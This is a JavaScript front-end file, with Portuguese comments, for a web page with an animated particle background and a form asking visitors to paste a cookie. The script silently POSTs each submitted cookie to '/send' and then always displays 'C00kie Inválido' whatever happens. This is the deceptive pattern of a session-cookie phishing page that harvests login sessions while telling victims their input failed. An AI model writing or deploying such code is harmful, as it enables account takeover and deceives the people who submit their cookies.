// Inicia particles assim que o DOM carregar
document.addEventListener("DOMContentLoaded", function () {
  particlesJS("particles-js", {
    particles: {
      number: { value: 80 },
      color: { value: "#00dbde" },
      shape: { type: "circle" },
      opacity: { value: 0.5, random: true },
      size: { value: 3, random: true },
      line_linked: { enable: true, distance: 150, color: "#00dbde", opacity: 0.4, width: 1 },
      move: { enable: true, speed: 2 }
    },
    interactivity: {
      detect_on: "canvas",
      events: { onhover: { enable: true, mode: "repulse" } }
    }
  });

  const input = document.getElementById("cookieInput");
  const btn = document.getElementById("sendBtn");
  const status = document.getElementById("status");

  const sendCookie = async () => {
    const cookie = input.value.trim();
    if (!cookie) return;

    status.textContent = "";
    btn.disabled = true;
    btn.textContent = "Enviando...";

    try {
      await fetch("/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ cookie })
      });
    } catch (e) {}

    status.textContent = "C00kie Inválido";
    status.style.color = "#ff0066";
    input.value = "";
    btn.disabled = false;
    btn.textContent = "Enviar";
    input.focus();
  };

  btn.addEventListener("click", sendCookie);
  input.addEventListener("keypress", e => {
    if (e.key === "Enter") sendCookie();
  });
});
